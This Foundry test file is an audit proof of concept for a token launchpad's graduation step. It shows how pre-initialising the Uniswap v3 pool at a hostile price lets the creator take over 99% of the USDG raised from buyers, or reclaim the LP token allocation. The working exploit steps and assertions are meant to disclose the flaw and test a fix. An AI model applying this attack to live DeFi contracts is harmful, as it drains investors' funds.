// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {GraduationManager} from "../../src/GraduationManager.sol";
import {HoodiumFactory} from "../../src/HoodiumFactory.sol";
import {HoodiumToken} from "../../src/HoodiumToken.sol";
import {LPLocker} from "../../src/LPLocker.sol";
import {FeeVault} from "../../src/FeeVault.sol";
import {MockUSDG} from "../mocks/MockUSDG.sol";
import {MockUniswapFactory, MockUniswapPool} from "../mocks/MockUniswap.sol";
import {INonfungiblePositionManager} from "../../src/interfaces/IUniswapV3.sol";

/**
 * AUDIT PoC — hostile pool pre-initialisation before graduation.
 *
 * `GraduationManager._ensurePool` keeps an existing pool and its price as-is,
 * and `_mintAndLock` mints with amount0Min = amount1Min = 0 and returns the
 * unused side to the *creator* as "dust". Because HoodiumToken is freely
 * transferable before graduation, anyone holding a few tokens (bought from the
 * curve) can `createPool` + `initialize` the USDG/TOKEN 1% pool on the real
 * Uniswap v3 factory at any price. The repo's own MockPositionManager ignores
 * price (it uses `dustBps`), so this file carries a price-aware stand-in that
 * reproduces Uniswap's LiquidityAmounts maths for a full-range position.
 */
contract PricedPositionManager is ERC721 {
    using SafeERC20 for IERC20;

    uint160 constant MIN_SQRT_RATIO = 4295128739;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;
    uint256 constant Q96 = 1 << 96;

    struct Position {
        address token0;
        address token1;
        uint128 liquidity;
    }

    MockUniswapFactory public immutable factory;
    mapping(uint256 => Position) public positionOf;
    uint256 public nextId = 1;

    constructor(MockUniswapFactory f) ERC721("Priced Position", "PPOS") {
        factory = f;
    }

    function _liq0(uint160 sqrtA, uint160 sqrtB, uint256 amount0) private pure returns (uint256) {
        uint256 intermediate = Math.mulDiv(sqrtA, sqrtB, Q96);
        return Math.mulDiv(amount0, intermediate, sqrtB - sqrtA);
    }

    function _liq1(uint160 sqrtA, uint160 sqrtB, uint256 amount1) private pure returns (uint256) {
        return Math.mulDiv(amount1, Q96, sqrtB - sqrtA);
    }

    function _amt0(uint160 sqrtA, uint160 sqrtB, uint256 L) private pure returns (uint256) {
        return Math.mulDiv(L << 96, sqrtB - sqrtA, sqrtB) / sqrtA;
    }

    function _amt1(uint160 sqrtA, uint160 sqrtB, uint256 L) private pure returns (uint256) {
        return Math.mulDiv(L, sqrtB - sqrtA, Q96);
    }

    function mint(INonfungiblePositionManager.MintParams calldata p)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
    {
        address pool = factory.getPool(p.token0, p.token1, p.fee);
        (uint160 sqrtP,,,,,,) = MockUniswapPool(pool).slot0();
        require(sqrtP > 0, "uninitialised");

        // Full range: current price is strictly inside (MIN, MAX).
        uint160 lo = MIN_SQRT_RATIO + 1;
        uint160 hi = MAX_SQRT_RATIO - 1;
        uint256 L0 = _liq0(sqrtP, hi, p.amount0Desired);
        uint256 L1 = _liq1(lo, sqrtP, p.amount1Desired);
        uint256 L = L0 < L1 ? L0 : L1;
        require(L <= type(uint128).max, "L overflow");
        liquidity = uint128(L);

        amount0 = _amt0(sqrtP, hi, L);
        amount1 = _amt1(lo, sqrtP, L);
        if (amount0 > p.amount0Desired) amount0 = p.amount0Desired;
        if (amount1 > p.amount1Desired) amount1 = p.amount1Desired;
        require(amount0 >= p.amount0Min && amount1 >= p.amount1Min, "Price slippage check");

        IERC20(p.token0).safeTransferFrom(msg.sender, address(this), amount0);
        IERC20(p.token1).safeTransferFrom(msg.sender, address(this), amount1);

        tokenId = nextId++;
        positionOf[tokenId] = Position(p.token0, p.token1, liquidity);
        _mint(p.recipient, tokenId);
    }

    function collect(INonfungiblePositionManager.CollectParams calldata)
        external
        payable
        returns (uint256, uint256)
    {
        return (0, 0);
    }

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96,
            address,
            address token0,
            address token1,
            uint24,
            int24,
            int24,
            uint128 liquidity,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        Position storage p = positionOf[tokenId];
        return (0, address(0), p.token0, p.token1, 0, 0, 0, p.liquidity, 0, 0, 0, 0);
    }
}

contract PoolPreInitAuditTest is Test {
    uint256 constant USDG_UNIT = 1e6;
    uint256 constant TOKEN_UNIT = 1e18;

    MockUSDG usdg;
    FeeVault vault;
    MockUniswapFactory uniFactory;
    PricedPositionManager pm;
    LPLocker locker;
    GraduationManager manager;
    HoodiumFactory factory;
    HoodiumToken token;
    BondingCurve curve;

    address creator = makeAddr("creator");
    address alice = makeAddr("alice");

    function setUp() public {
        usdg = new MockUSDG();
        address[] memory owners = new address[](2);
        owners[0] = makeAddr("s1");
        owners[1] = makeAddr("s2");
        vault = new FeeVault(owners, 2);

        uniFactory = new MockUniswapFactory();
        pm = new PricedPositionManager(uniFactory);
        locker = new LPLocker(address(pm), address(vault), 3_000);
        manager = new GraduationManager(address(uniFactory), address(pm), address(locker), address(usdg), 10_000, 200);

        factory = new HoodiumFactory(
            HoodiumFactory.FactoryConfig({
                usdg: address(usdg),
                feeVault: address(vault),
                graduationManager: address(manager),
                tokenDecimals: 18,
                totalSupply: 1_000_000_000 * TOKEN_UNIT,
                curveAllocation: 800_000_000 * TOKEN_UNIT,
                virtualUsdg: 12_000 * USDG_UNIT,
                graduationTarget: 69_000 * USDG_UNIT,
                graduationFee: 0,
                tradeFeeBps: 100,
                creatorFeeShareBps: 7_000,
                creationFee: 0,
                devBuyMaxBps: 500,
                snipeBlocks: 3,
                snipeMaxBps: 100
            })
        );

        vm.prank(creator);
        (address t, address c) = factory.launch("Grad", "GRAD", "ipfs://x", 0, 0);
        token = HoodiumToken(t);
        curve = BondingCurve(c);
        vm.roll(block.number + 4);
    }

    function _fillCurve() internal {
        uint256 amount = 200_000 * USDG_UNIT;
        usdg.mint(alice, amount);
        vm.startPrank(alice);
        usdg.approve(address(curve), amount);
        curve.buy(amount, 0);
        vm.stopPrank();
        assertTrue(curve.curveComplete());
    }

    function _order() internal view returns (address t0, address t1, bool usdgIsToken1) {
        usdgIsToken1 = address(token) < address(usdg);
        (t0, t1) = usdgIsToken1 ? (address(token), address(usdg)) : (address(usdg), address(token));
    }

    /// sqrt(amount1/amount0) in Q96 — same construction GraduationManager uses.
    function _sqrtPriceX96(uint256 amount0, uint256 amount1) internal pure returns (uint160) {
        uint256 ratioX96 = Math.mulDiv(amount1, 1 << 96, amount0);
        return uint160(Math.sqrt(ratioX96) << 48);
    }

    /// Baseline: with a fresh pool, essentially all USDG lands in the pool.
    function test_baseline_freshPool_usdgGoesToPool() public {
        _fillCurve();
        uint256 reserve = curve.reserveUsdg();
        uint256 creatorBefore = usdg.balanceOf(creator);

        curve.graduate();

        uint256 dust = usdg.balanceOf(creator) - creatorBefore;
        assertLt(dust, reserve / 1000, "fresh pool should leave < 0.1% dust");
        assertGt(usdg.balanceOf(address(pm)), reserve * 999 / 1000, "pool should hold the reserves");
    }

    /**
     * CRITICAL. The creator (or anyone) initialises the pool at a price that
     * makes the token look ~10^6x cheaper in USDG than the curve's closing
     * price. Graduation mints against that price, consumes all the tokens and
     * almost none of the USDG, and hands the unused USDG to the creator as
     * "dust". The 69k USDG raised from buyers walks out the door in one
     * transaction, and the locked pool holds the whole LP allocation at a
     * near-zero price for anyone to buy.
     */
    function test_creatorPreInitsPoolAtHostilePrice_walksAwayWithTheReserves() public {
        _fillCurve();
        (address t0, address t1, bool usdgIsToken1) = _order();

        // Fair closing price, as GraduationManager would set it.
        uint256 usdgForLp = curve.reserveUsdg();
        uint256 tokensForLp = curve.lpAllocation() + (curve.curveAllocation() - curve.tokensSold());
        (uint256 a0, uint256 a1) = usdgIsToken1 ? (tokensForLp, usdgForLp) : (usdgForLp, tokensForLp);
        uint160 fair = _sqrtPriceX96(a0, a1);

        // Hostile: USDG side is over-valued 10^6x relative to the token.
        //   USDG is token1 -> lower sqrtP (token1 per token0 falls)
        //   USDG is token0 -> raise sqrtP
        uint160 hostile = usdgIsToken1 ? fair / 1000 : fair * 1000;

        // Anyone can do this on the real Uniswap v3 factory; no tokens needed.
        address pool = uniFactory.createPool(t0, t1, 10_000);
        MockUniswapPool(pool).initialize(hostile);

        uint256 creatorUsdgBefore = usdg.balanceOf(creator);
        uint256 creatorTokBefore = token.balanceOf(creator);

        // Permissionless graduation — the creator calls it themself.
        vm.prank(creator);
        curve.graduate();

        uint256 stolenUsdg = usdg.balanceOf(creator) - creatorUsdgBefore;
        uint256 poolUsdg = usdg.balanceOf(address(pm));

        emit log_named_uint("reserve USDG raised from buyers", usdgForLp);
        emit log_named_uint("USDG returned to creator as 'dust'", stolenUsdg);
        emit log_named_uint("USDG actually in the pool", poolUsdg);
        emit log_named_uint("tokens returned to creator", token.balanceOf(creator) - creatorTokBefore);

        assertGt(stolenUsdg, usdgForLp * 99 / 100, "creator should receive >99% of the USDG reserve");
        assertLt(poolUsdg, usdgForLp / 100, "pool receives < 1% of the reserve");
        assertEq(token.balanceOf(address(curve)), 0, "curve emptied of tokens");
        // Only the unclaimed trade fees remain in the curve; the reserve is gone.
        uint256 feesHeld = curve.creatorFeesAccrued() + curve.platformFeesAccrued() - curve.creatorFeesClaimed()
            - curve.platformFeesClaimed();
        assertEq(usdg.balanceOf(address(curve)), feesHeld, "curve holds only unclaimed fees");
    }

    /// The mirror image: over-value the token, and the creator receives the LP
    /// token allocation back (200M tokens) to dump on a pool holding all the USDG.
    function test_preInitOtherDirection_creatorGetsTheLpTokensBack() public {
        _fillCurve();
        (address t0, address t1, bool usdgIsToken1) = _order();

        uint256 usdgForLp = curve.reserveUsdg();
        uint256 tokensForLp = curve.lpAllocation() + (curve.curveAllocation() - curve.tokensSold());
        (uint256 a0, uint256 a1) = usdgIsToken1 ? (tokensForLp, usdgForLp) : (usdgForLp, tokensForLp);
        uint160 fair = _sqrtPriceX96(a0, a1);
        uint160 hostile = usdgIsToken1 ? fair * 1000 : fair / 1000;

        address pool = uniFactory.createPool(t0, t1, 10_000);
        MockUniswapPool(pool).initialize(hostile);

        uint256 creatorTokBefore = token.balanceOf(creator);
        curve.graduate();

        uint256 tokensBack = token.balanceOf(creator) - creatorTokBefore;
        emit log_named_uint("tokens for LP", tokensForLp);
        emit log_named_uint("tokens handed back to creator", tokensBack);
        assertGt(tokensBack, tokensForLp * 99 / 100, "creator receives >99% of the LP token allocation");
        assertGt(usdg.balanceOf(address(pm)), usdgForLp * 99 / 100, "pool holds all the USDG");
    }
}
